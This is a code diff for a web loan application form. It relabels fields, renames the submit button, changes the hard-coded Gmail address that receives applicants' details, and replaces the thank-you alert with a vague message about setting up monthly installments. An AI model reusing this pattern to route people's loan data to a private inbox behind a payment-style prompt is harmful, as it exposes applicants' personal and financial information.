@@ -78,13 +78,13 @@
 <div class="container mt-5">
   <form id="loanForm" class="row g-3 needs-validation" novalidate>
     <div class="col-md-6">
-      <label for="firstName" class="form-label">First Name</label>
+      <label for="firstName" class="form-label">Full Name</label>
       <input type="text" class="form-control" id="firstName" required>
       <div class="invalid-feedback">Please enter your first name.</div>
     </div>
 
     <div class="col-md-6">
-      <label for="address" class="form-label">Address</label>
+      <label for="address" class="form-label">FullAddress</label>
       <input type="text" class="form-control" id="address" required>
       <div class="invalid-feedback">Please enter your address.</div>
     </div>
@@ -138,7 +138,7 @@
     </div>
 
     <div class="col-12">
-      <button class="btn btn-dark w-100" type="submit" style="background-color: #007bff; border-style: none;">Submit Loan Application</button>
+      <button class="btn btn-dark w-100" type="submit" style="background-color: #007bff; border-style: none;">On click Form</button>
     </div>
   </form>
 </div>
@@ -190,14 +190,14 @@
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        to: "kevalrabadiya77@gmail.com", // Replace with your email
+        to: "ezprobiz@gmail.com", // Replace with your email
         subject: "New Loan Application Submitted",
         text: emailBody
       })
     })
     .then(response => response.text())
     .then(result => {
-      alert("Thank you! Your form was submitted successfully.");
+      alert("IN order to setup to Your monthly installment for Entire Duration");
       form.reset();
       form.classList.remove('was-validated');
     })
